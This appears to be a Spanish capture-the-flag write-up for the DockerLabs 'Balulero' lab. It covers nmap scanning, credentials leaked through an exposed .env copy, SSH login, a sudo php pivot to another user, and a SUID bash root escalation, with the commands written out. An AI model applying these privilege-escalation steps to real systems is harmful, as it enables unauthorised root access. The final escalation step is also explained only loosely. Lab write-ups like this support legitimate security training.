# 🖥️ Writeup - Balulero 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip balulero.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh balulero.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 18:40 CET
Nmap scan report for 172.17.0.2
Host is up (0.000053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mi Landing Page - Ciberseguridad
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
```

Tenemos los puertos `22` y `80` abiertos.

Accedemos a la página web en el puerto `80` y encontramos en el código fuente un archivo `script.js`. Revisando su contenido encontramos lo siguiente:

```
// Funcionalidad para ocultar/mostrar el header al hacer scroll y el secretito de la web
    console.log("Se ha prohibido el acceso al archivo .env, que es donde se guarda la password de backup, pero hay una copia llamada .env_de_baluchingon visible jiji")
    let lastScrollTop = 0;
```

Nos indica que existe un directorio oculto llamado `.env_de_baluchingon` que contiene la `contraseña` de `backup`.

Vamos a ver su contenido navegando a `http://172.17.0.2/.env_de_baluchingon`.

![alt text](../../images/balulero.png)

Encontramos las credenciales de recuperación para el usuario `balu` : `balubalulerobalulei`.

Vamos a intentar acceder por `SSH` con estas credenciales.

```bash
ssh balu@172.17.0.2
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash 
sudo -l
```

Info:
```
Matching Defaults entries for balu on c64bde09402c:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User balu may run the following commands on c64bde09402c:
    (chocolate) NOPASSWD: /usr/bin/php
```

Observamos que podemos ejecutar el binario `php` con privilegios del usuario `chocolate`. Lo aprovechamos para pivotar lateralmente de la siguiente manera:

```bash
CMD=/bin/bash
sudo -u chocolate /usr/bin/php -r "system('$CMD');"
```

Una vez como usuario `chocolate`, encontramos en el directorio `/opt` un archivo `script.php` sobre el cual tenemos permisos de escritura.

Vamos a modificar este archivo para que, al ejecutarlo, otorgue permisos `SUID` al binario `/bin/bash`.

```bash
echo "<?php system('chmod u+s /bin/bash'); ?>" > /opt/script.php
chmod +x script.php
./script.php
```

En este punto, la escalada de privilegios a `root` es tan sencilla como ejecutar el comando:

```bash
/bin/bash -p
```

Info:
```
bash-5.0# whoami
root
bash-5.0#
```

Ya somos root!